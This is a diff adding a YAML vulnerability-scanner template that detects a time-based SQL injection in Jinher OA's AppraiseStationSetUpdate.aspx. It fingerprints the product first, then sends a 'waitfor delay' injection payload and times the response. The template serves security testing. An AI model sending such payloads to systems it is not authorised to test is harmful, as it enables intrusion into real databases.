@@ -1,0 +1,39 @@
+id: poc-yaml-jinher-appraisestationsetupdate-aspx-sqli
+info:
+  name: Jinher OA AppraiseStationSetUpdate.aspx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "JHSoft"
+
+  - raw:
+      - |
+        GET /c6/Jhsoft.Web.Appraise/AppraiseStationSetUpdate.aspx/?id=1'waitfor+delay'0:0:{{t1}}'--&Name=1 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
